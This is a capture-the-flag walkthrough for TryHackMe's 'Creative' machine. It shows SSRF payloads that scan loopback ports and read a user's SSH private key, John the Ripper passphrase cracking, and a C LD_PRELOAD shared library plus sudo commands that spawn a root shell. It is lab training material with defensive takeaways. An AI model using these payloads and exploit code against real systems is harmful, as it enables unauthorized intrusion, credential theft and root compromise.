# THM: Creative

**Category:** Web / Privilege Escalation  
**Difficulty:** Easy  
**Platform:** TryHackMe

---

## Overview

A web server with a hidden beta subdomain exposes an SSRF vulnerability that can be leveraged to enumerate internal services and extract credentials. From there, a misconfigured `sudo` environment with `LD_PRELOAD` set allows privilege escalation to root.

---

## Enumeration

### Port Scan

```bash
nmap -sC -sV -oN nmap_initial.txt TARGET_IP
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Only two ports open — SSH and HTTP. The HTTP server immediately redirects to `http://creative.thm`, so we add that to `/etc/hosts`.

---

### Web Enumeration

The main site at `creative.thm` shows a static landing page with a list of potential usernames and a components page. A directory scan returns nothing beyond the obvious:

```bash
gobuster dir -u http://creative.thm -w /usr/share/wordlists/dirb/common.txt
```

No useful directories found. Moving to **virtual host enumeration**:

```bash
gobuster vhost -u http://creative.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

This reveals a **`beta.creative.thm`** subdomain. Adding it to `/etc/hosts` and navigating there shows a "URL Tester" — a form that fetches a provided URL and displays the response.

---

## Exploitation — SSRF

The URL Tester is immediately suspicious. Testing with known external URLs confirms it fetches content. The interesting question is whether it will fetch internal/loopback addresses.

```
http://127.0.0.1/
```

Testing this (via Burp Suite Intruder, since the page had rendering issues in the browser) confirms the server fetches its own loopback address and returns content. This is a **Server-Side Request Forgery (SSRF)** vulnerability.

### Internal Port Discovery

With SSRF confirmed, we enumerate ports on localhost to find internal services not exposed externally. Using Burp Intruder with a numeric payload list (1–65535):

```
http://127.0.0.1:§PORT§/
```

Port **1337** returns a response — a directory listing of the server's filesystem.

### Filesystem Traversal

With directory listing enabled, we can navigate the filesystem by appending paths to the URL:

```
http://127.0.0.1:1337/home/
http://127.0.0.1:1337/home/saad/
http://127.0.0.1:1337/home/saad/.ssh/
```

This reveals `id_rsa` — the private SSH key for the user `saad`.

```
http://127.0.0.1:1337/home/saad/.ssh/id_rsa
```

Copy the key content from the response.

---

## Foothold — SSH Access

The private key is passphrase-protected. Crack it with John the Ripper:

```bash
# Convert to crackable format
ssh2john id_rsa > id_rsa.hash

# Crack with rockyou
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Once the passphrase is recovered, set correct permissions and connect:

```bash
chmod 600 id_rsa
ssh -i id_rsa saad@TARGET_IP
```

**User flag** is accessible at `/home/saad/user.txt`.

---

## Privilege Escalation — LD_PRELOAD

### Initial Enumeration

```bash
# Check sudo permissions
sudo -l
```

The output reveals two things:
1. The `saad` user can run `ping` as root
2. The `LD_PRELOAD` environment variable is **preserved** in the sudo context (`env_keep += LD_PRELOAD`)

### Why LD_PRELOAD Matters

`LD_PRELOAD` instructs the dynamic linker to load a specified shared library before all others. If this variable is preserved when running `sudo`, we can inject a malicious library into a root-executed process.

```bash
# .bash_history leaks saad's password — always check this
cat ~/.bash_history
```

### Exploit

Compile a malicious shared library that spawns a shell:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so ping
```

This spawns a root shell.

---

## Key Takeaways

- SSRF vulnerabilities in "URL preview" or "URL fetch" features are extremely common — always test loopback addresses and internal RFC1918 ranges
- Internal port scanning via SSRF can reveal services that are intentionally not exposed externally but are still listening
- `LD_PRELOAD` preserved across `sudo` is a well-known misconfiguration — `env_keep` in `/etc/sudoers` should be audited carefully
- `.bash_history` is frequently cleared on CTF/HTB machines but often overlooked in real-world environments — always check it
